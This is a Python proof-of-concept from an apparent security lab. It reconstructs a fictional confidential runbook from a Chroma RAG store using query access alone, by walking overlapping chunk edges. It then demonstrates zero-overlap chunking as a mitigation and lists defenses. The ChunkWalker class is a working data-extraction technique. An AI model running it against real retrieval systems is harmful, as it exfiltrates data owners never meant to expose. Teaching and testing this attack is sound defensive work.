"""
OWASP LLM06 PoC: Full-Corpus Extraction via Chunk-Overlap Walking

Companion to rag_poisoning_demo.py. Poisoning is an INTEGRITY attack: the
attacker corrupts what comes out of the store. This is the CONFIDENTIALITY
counterpart: the attacker exfiltrates what should never come out, using
nothing but read (query) access.

The primitive
-------------
RAG stores are built with OVERLAPPING chunks so a fact on a chunk boundary
is not lost. That same overlap turns the store into a linked list: every
chunk carries a verbatim copy of its neighbour's edge. So an attacker who
can only call query() can:

  1. get one foothold chunk from any innocuous query,
  2. take that chunk's LAST `overlap` chars and query with them; the NEXT
     chunk STARTS with exactly those chars, so it comes back as the hit,
  3. take the FIRST `overlap` chars to find the PREVIOUS chunk,
  4. walk both directions to the ends of the document,
  5. strip the duplicated overlap at each join and reassemble the original.

No LLM is involved. Retriever read access is the whole trust boundary. This
maps to OWASP LLM06 (Sensitive Information Disclosure) and LLM10 (systematic
scraping to reconstruct a proprietary corpus).

The demo runs in three phases:
  Phase 1 - Defender builds a store from a confidential document with
            overlapping chunks. The attacker never sees the document.
  Phase 2 - Attacker, given ONLY a query handle, walks the overlap links
            and reconstructs the document. Recovery is verified by diff.
  Phase 3 - Mitigation: rebuild with zero overlap + boundary-aware
            splitting, and show the walk collapses to ordinary semantic
            fishing.

Note on recovery rate: on a small, controlled corpus with predictable
overlap the walk recovers ~100%. On a large, repetitive real corpus (see
lab040_RAG/data/llms-full.txt) a naive single chain recovers far less
(~30% in testing) because near-duplicate passages crowd the true successor
out of the top-k. Recovery is bounded by retrieval recall, not by the
overlap idea. Raising it (larger k, literal re-rank, multi-seed merge) is
left as an exercise; see the end of this file.

Prerequisites:
    pip install chromadb openai
    export OPENAI_API_KEY="your-key-here"
    chroma run --path ./chroma_db --host 127.0.0.1 --port 8000
"""

import os
import re
import hashlib
import difflib

import chromadb
from chromadb.utils import embedding_functions

# ---------------------------------------------------------------
# Setup
# ---------------------------------------------------------------
chroma = chromadb.HttpClient(host="localhost", port=8000, ssl=False)

openai_ef = embedding_functions.OpenAIEmbeddingFunction(
    api_key=os.environ["OPENAI_API_KEY"],
    model_name="text-embedding-3-small",
)

# ---------------------------------------------------------------
# The "confidential" corpus. Entirely fictional. This stands in for an
# internal runbook, HR memo, or knowledge base that the defender indexed
# for RAG and never intended a caller to read in full.
# ---------------------------------------------------------------
CONFIDENTIAL_DOC = (
    "INTERNAL RUNBOOK -- PROJECT HALCYON -- CONFIDENTIAL. Distribution is "
    "restricted to the platform on-call rotation. The staging control plane "
    "runs in the eu-west-1 account under the halcyon-stg organizational unit. "
    "Break-glass access is granted through the halcyon-breakglass role, which "
    "requires a second approver from the security guild before assumption. "
    "The primary Postgres cluster is halcyon-db-stg and fails over to the "
    "warm standby in eu-central-1 within ninety seconds of a health-check "
    "miss. Rotating the database credentials is a two-step process: first "
    "issue the new secret in the vault path secret/halcyon/db, then trigger "
    "the rolling restart of the api-gateway deployment so the sidecar picks "
    "up the change. Never rotate during the nightly batch window between "
    "0100 and 0300 UTC because the reconciliation job holds long-lived "
    "connections and will fail closed. The incident commander for a Sev1 is "
    "whoever holds the pager; escalation to engineering leadership happens at "
    "the thirty-minute mark if the customer-facing error rate stays above "
    "two percent. Postmortems are blameless and due within five business "
    "days. The feature-flag service is authoritative for all rollout state, "
    "and flags must be removed within one release of reaching full rollout "
    "to keep the flag graph from rotting. End of runbook."
)

# ---------------------------------------------------------------
# Deterministic fixed-stride chunker: chunk[i][-OVERLAP:] == chunk[i+1][:OVERLAP]
# ---------------------------------------------------------------
CHUNK_SIZE = 400
OVERLAP = 80
STRIDE = CHUNK_SIZE - OVERLAP


def fixed_stride_chunks(text, size, stride):
    chunks, i, n = [], 0, len(text)
    while i < n:
        chunks.append(text[i:i + size])
        if i + size >= n:
            break
        i += stride
    return chunks


def build_store(name, text, size, overlap):
    try:
        chroma.delete_collection(name)
    except Exception:
        pass
    col = chroma.create_collection(
        name=name,
        metadata={"hnsw:space": "cosine"},
        embedding_function=openai_ef,
    )
    stride = size - overlap if overlap < size else size
    pieces = fixed_stride_chunks(text, size, stride)
    col.upsert(
        ids=[f"chunk-{i}" for i in range(len(pieces))],
        documents=pieces,
        metadatas=[{"source": "confidential"} for _ in pieces],
    )
    return col, pieces


# ---------------------------------------------------------------
# The ONLY thing the attacker is given: a query handle.
# No documents, no ids, no chunk count, no config.
# ---------------------------------------------------------------
class RetrieverAPI:
    def __init__(self, col):
        self._col = col
        self.calls = 0

    def search(self, query, k=8):
        self.calls += 1
        res = self._col.query(query_texts=[query], n_results=k, include=["documents"])
        return res["documents"][0]


def _h(s):
    return hashlib.sha256(s.encode("utf-8", "ignore")).hexdigest()


class ChunkWalker:
    def __init__(self, api, overlap):
        self.api = api
        self.overlap = overlap
        self.visited = set()

    def _step(self, edge, direction):
        candidates = self.api.search(edge, k=8)
        for c in candidates:
            if _h(c) in self.visited:
                continue
            if direction == "forward" and c.startswith(edge):
                return c
            if direction == "backward" and c.endswith(edge):
                return c
        return None

    def walk(self, seed_query):
        hits = self.api.search(seed_query, k=1)
        if not hits:
            raise RuntimeError("empty store")
        seed = hits[0]
        self.visited.add(_h(seed))

        forward, cur = [], seed
        while True:
            nxt = self._step(cur[-self.overlap:], "forward")
            if nxt is None:
                break
            self.visited.add(_h(nxt))
            forward.append(nxt)
            cur = nxt

        backward, cur = [], seed
        while True:
            prev = self._step(cur[:self.overlap], "backward")
            if prev is None:
                break
            self.visited.add(_h(prev))
            backward.append(prev)
            cur = prev

        return list(reversed(backward)) + [seed] + forward

    def reassemble(self, ordered):
        if not ordered:
            return ""
        out = ordered[0]
        for nxt in ordered[1:]:
            if nxt.startswith(out[-self.overlap:]):
                out += nxt[self.overlap:]
            else:
                trim = 0
                for L in range(min(self.overlap, len(nxt)), 5, -1):
                    if out.endswith(nxt[:L]):
                        trim = L
                        break
                out += nxt[trim:]
        return out


def _norm(s):
    return re.sub(r"\s+", " ", s).strip()


# ---------------------------------------------------------------
# Phase 1: Defender indexes a confidential document (with overlap)
# ---------------------------------------------------------------
print("=" * 60)
print("PHASE 1: Defender indexes a confidential document")
print("=" * 60)

col, pieces = build_store("extract_demo", CONFIDENTIAL_DOC, CHUNK_SIZE, OVERLAP)
print(f"  Indexed {len(pieces)} overlapping chunks "
      f"(size={CHUNK_SIZE}, overlap={OVERLAP}).")
print(f"  The attacker cannot see these chunks, the count, or the config.")

# ---------------------------------------------------------------
# Phase 2: Attacker reconstructs it with query access only
# ---------------------------------------------------------------
print("\n" + "=" * 60)
print("PHASE 2: Attacker walks the overlap links (query access only)")
print("=" * 60)

api = RetrieverAPI(col)
walker = ChunkWalker(api, overlap=OVERLAP)
# An innocuous foothold query. The attacker does not know the topic.
ordered = walker.walk(seed_query="internal system information")
recovered = walker.reassemble(ordered)

ratio = difflib.SequenceMatcher(None, _norm(CONFIDENTIAL_DOC), _norm(recovered)).ratio()
print(f"  chunks recovered      : {len(ordered)} / {len(pieces)}")
print(f"  query() calls used    : {api.calls}")
print(f"  text similarity ratio : {ratio:.2%}")
print(f"\n  Reconstructed opening (attacker never opened the source):")
print(f"    {recovered[:160]}...")
if ratio > 0.98:
    print("\n  ^^ Near-perfect reconstruction from read access alone.")

# ---------------------------------------------------------------
# Phase 3: Mitigation -- kill the linked list
# ---------------------------------------------------------------
print("\n" + "=" * 60)
print("PHASE 3: Mitigation (zero overlap breaks the link)")
print("=" * 60)

col2, pieces2 = build_store("extract_demo_hardened", CONFIDENTIAL_DOC, CHUNK_SIZE, 0)
api2 = RetrieverAPI(col2)
walker2 = ChunkWalker(api2, overlap=OVERLAP)
ordered2 = walker2.walk(seed_query="internal system information")
recovered2 = walker2.reassemble(ordered2)
ratio2 = difflib.SequenceMatcher(None, _norm(CONFIDENTIAL_DOC), _norm(recovered2)).ratio()
print(f"  With chunk_overlap=0:")
print(f"  chunks recovered      : {len(ordered2)} / {len(pieces2)}")
print(f"  text similarity ratio : {ratio2:.2%}")
print("  ^^ No shared edges, so the walk cannot chain. It degrades to")
print("     ordinary semantic fishing and recovers only scattered chunks.")

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
print("\n" + "-" * 60)
for c in ("extract_demo", "extract_demo_hardened"):
    try:
        chroma.delete_collection(c)
    except Exception:
        pass
print("Cleaned up: deleted extract_demo collections.")
print()
print("KEY TAKEAWAYS:")
print("  1. Chunk overlap makes the store a linked list; read access alone")
print("     can reconstruct entire documents. No write, no LLM needed.")
print("  2. This is OWASP LLM06 (Sensitive Information Disclosure) and LLM10")
print("     (systematic scraping / knowledge-base reconstruction).")
print("  3. Overlap is a recall/latency tradeoff. Minimize it, and prefer")
print("     boundary-aware splitting over blind character windows.")
print("  4. Defense in depth: per-caller retrieval scoping and rate limits,")
print("     cap n_results, dedupe near-identical hits, and do not hand raw")
print("     chunk text back to untrusted callers.")
print()
print("EXERCISE: point the walker at lab040_RAG/data/llms-full.txt (large,")
print("repetitive). A naive single chain recovers ~30%. Raise it with larger")
print("k, literal overlap re-ranking, and multi-seed chain merging.")
